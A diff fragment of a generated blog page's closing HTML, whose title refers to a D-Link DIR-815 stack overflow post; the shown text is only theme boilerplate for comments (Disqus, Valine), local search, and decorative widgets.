+        this.page.identifier = '2020/12/19/D-LINK-DIR815-stack-overflow/';
+        this.page.title = 'D-LINK-DIR815_stack_overflow';
+        };
+      function loadComments () {
+        var d = document, s = d.createElement('script');
+        s.src = 'https://xmzyshypnc.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      }
+      
+        loadComments();
+      
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  
+  
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(function (item) {
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: true,
+        notify: true,
+        appId: 'YbpHIa6XHNsKv4wX2wGjnrK7-gzGzoHsz',
+        appKey: '1fjf9mQl90nKdRPfq1zhDyIE',
+        placeholder: 'Just go go',
+        avatar:'mm',
+        meta:guest,
+        pageSize:'10' || 10,
+        visitor: true
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"right","hOffset":0,"vOffset":-50},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"tagMode":false});</script></body>
+</html>
